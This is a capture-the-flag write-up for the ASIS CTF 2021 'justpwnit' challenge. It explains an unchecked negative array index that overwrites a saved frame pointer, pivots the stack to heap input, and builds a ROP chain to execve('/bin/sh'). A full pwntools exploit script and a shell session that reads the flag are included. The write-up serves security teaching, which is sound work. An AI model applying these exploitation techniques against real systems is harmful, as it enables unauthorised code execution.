You can find the related files
[here](https://github.com/ret2school/ctf/blob/master/2021/asisctf).

# justpwnit

justpwnit was a warmup pwn challenge. That's only a basic stack overflow.  
The binary is statically linked and here is the checksec's output:

```  
[*] '/home/nasm/justpwnit'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```  
Morever the source code is provided as it is the case for all the pwn tasks !  
Here it is:  
```c  
/*  
* musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static  
*/  
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>

#define STR_SIZE 0x80

void set_element(char **parray) {  
 int index;  
 printf("Index: ");  
 if (scanf("%d%*c", &index) != 1)  
   exit(1);  
 if (!(parray[index] = (char*)calloc(sizeof(char), STR_SIZE)))  
   exit(1);  
 printf("Data: ");  
 if (!fgets(parray[index], STR_SIZE, stdin))  
   exit(1);  
}

void justpwnit() {  
 char *array[4];  
 for (int i = 0; i < 4; i++) {  
   set_element(array);  
 }  
}

int main() {  
 setvbuf(stdin, NULL, _IONBF, 0);  
 setvbuf(stdout, NULL, _IONBF, 0);  
 alarm(180);  
 justpwnit();  
 return 0;  
}  
```

The program is basically reading `STR_SIZE` bytes into `parray[index]`, the
issue is that there is no check on the user controlled index from which we
choose were write the input.  
Furthermore, `index` is a signed integer, which means we can input a negative
value. If we do so we will be able to overwrite the saved `$rbp` value of the
`set_element` stackframe by a heap pointer to our input. By this way at the
end of the pwninit, the `leave` instruction will pivot the stack from the
original state to a pointer to the user input.

Let's see this in gdb !

```  
00:0000│ rsp     0x7ffef03864e0 ◂— 0x0  
01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4  
02:0010│         0x7ffef03864f0 ◂— 0x0  
03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */  
04:0020│         0x7ffef0386500 ◂— 0x0  
05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64  
06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1  
07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr
[rbp - 4], 1  
08:0040│ rax     0x7ffef0386520 ◂— 0xb4  
09:0048│         0x7ffef0386528 ◂— 0x0  
... ↓            4 skipped  
0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1  
0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0  
```

That's the stack's state when we are calling calloc. We can see the
`set_element`'s stackframe which ends up in `$rsp+38` with the saved return
address. And right after we see that `$rax` contains the address of the
`parray` buffer. Which means that if we send -2 as index, `$rbp` will point to
the newly allocated buffer to chich we will write right after with `fgets`.

Then, if we do so, the stack's state looks like this:

```  
00:0000│ rsp     0x7ffef03864e0 ◂— 0x0  
01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4  
02:0010│         0x7ffef03864f0 ◂— 0x0  
03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */  
04:0020│         0x7ffef0386500 ◂— 0x0  
05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64  
06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7f2e4aea1050 ◂— 0x0  
07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr
[rbp - 4], 1  
08:0040│         0x7ffef0386520 ◂— 0xb4  
09:0048│         0x7ffef0386528 ◂— 0x0  
... ↓            4 skipped  
0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1  
0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0  
```

The saved `$rbp` has been overwritten with a pointer to the user input. Then,
at the end of the `set_element` function, `$rbp` is popped from the stack and
contains a pointer to the user input. Which causes at the end of the
`justpwnit` function, the `leave` instruction moves the pointer to the user
input in `$rsp`.

## ROPchain

Once we can pivot the stack to makes it point to some user controlled areas,
we just have to rop through all the gadgets we can find in the binary.  
The binary is statically linked, so we can't make a ret2system, we have to
make a `execve("/bin/sh\0", NULL, NULL)`.

And so what we need is:  
- pop rdi gadget  
- pop rsi gadget  
- pop rdx gadget  
- pop rax gadget  
- syscall gadget  
- mov qword ptr [reg], reg [to write "/bin/sh\0"] in a writable area

We can easily find these gadgets with the help
(ROPgadget)[https://github.com/JonathanSalwan/ROPgadget].  
We got:

```  
0x0000000000406c32 : mov qword ptr [rax], rsi ; ret  
0x0000000000401001 : pop rax ; ret  
0x00000000004019a3 : pop rsi ; ret  
0x00000000004013e9 : syscall  
0x0000000000403d23 : pop rdx ; ret  
0x0000000000401b0d : pop rdi ; ret  
```

Now we just have to craft the ropchain !

```py  
POP_RDI = 0x0000000000401b0d  
POP_RDX = 0x0000000000403d23  
SYSCALL = 0x00000000004013e9  
POP_RAX = 0x0000000000401001  
POP_RSI = 0x00000000004019a3

MOV_RSI_PTR_RAX = 0x0000000000406c32  
PT_LOAD_W = 0x00000000040c240

pld = pwn.p64(0) + pwn.p64(POP_RSI) + b"/bin/sh\x00"  
pld += pwn.p64(POP_RAX) + pwn.p64(PT_LOAD_W)  
pld += pwn.p64(MOV_RSI_PTR_RAX)  
pld += pwn.p64(POP_RAX) + pwn.p64(0x3b)  
pld += pwn.p64(POP_RDI) + pwn.p64(PT_LOAD_W)  
pld += pwn.p64(POP_RSI) + pwn.p64(0)  
pld += pwn.p64(POP_RDX) + pwn.p64(0x0)  
pld += pwn.p64(SYSCALL)  
```

And we can enjoy the shell !

```  
➜  justpwnit git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=11010  
[*] '/home/nasm/pwn/asis2021/justpwnit/justpwnit'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[+] Opening connection to 168.119.108.148 on port 11010: Done  
[*] Switching to interactive mode  
$ id  
uid=999(pwn) gid=999(pwn) groups=999(pwn)  
$ ls  
chall  
flag-69a1f60d8055c88ea27fed1ab926b2b6.txt  
$ cat flag-69a1f60d8055c88ea27fed1ab926b2b6.txt  
ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}  
```

## Full exploit

```py  
#!/usr/bin/env python  
# -*- coding: utf-8 -*-

# this exploit was generated via  
# 1) pwntools  
# 2) ctfinit

import os  
import time  
import pwn

# Set up pwntools for the correct architecture  
exe  = pwn.context.binary = pwn.ELF('justpwnit')  
pwn.context.delete_corefiles = True  
pwn.context.rename_corefiles = False

host = pwn.args.HOST  
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):  
   '''Execute the target binary locally'''  
   if pwn.args.GDB:  
       return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)  
   else:  
       return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):  
   '''Connect to the process on the remote host'''  
   io = pwn.connect(host, port)  
   if pwn.args.GDB:  
       pwn.gdb.attach(io, gdbscript=gdbscript)  
   return io

def start(argv=[], *a, **kw):  
   '''Start the exploit against the target.'''  
   if pwn.args.LOCAL:  
       return local(argv, *a, **kw)  
   else:  
       return remote(argv, *a, **kw)  
gdbscript = '''  
source
/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py  
set follow-fork-mode parent  
b* main  
continue  
'''.format(**locals())

#===========================================================  
#                    EXPLOIT GOES HERE  
#===========================================================

io = start()  
io.sendlineafter(b"Index: ", b"-2")

# 0x0000000000406c32 : mov qword ptr [rax], rsi ; ret  
# 0x0000000000401001 : pop rax ; ret  
# 0x00000000004019a3 : pop rsi ; ret  
# 0x00000000004013e9 : syscall  
# 0x0000000000403d23 : pop rdx ; ret  
# 0x0000000000401b0d : pop rdi ; ret

POP_RDI = 0x0000000000401b0d  
POP_RDX = 0x0000000000403d23  
SYSCALL = 0x00000000004013e9  
POP_RAX = 0x0000000000401001  
POP_RSI = 0x00000000004019a3

MOV_RSI_PTR_RAX = 0x0000000000406c32

PT_LOAD_W = 0x00000000040c240

pld = pwn.p64(0) + pwn.p64(POP_RSI) + b"/bin/sh\x00"  
pld += pwn.p64(POP_RAX) + pwn.p64(PT_LOAD_W)  
pld += pwn.p64(MOV_RSI_PTR_RAX)  
pld += pwn.p64(POP_RAX) + pwn.p64(0x3b)  
pld += pwn.p64(POP_RDI) + pwn.p64(PT_LOAD_W)  
pld += pwn.p64(POP_RSI) + pwn.p64(0)  
pld += pwn.p64(POP_RDX) + pwn.p64(0x0)  
pld += pwn.p64(SYSCALL)

io.sendlineafter(b"Data: ", pld)

io.interactive()  
```

Original writeup (https://ret2school.github.io/post/pwnasis/).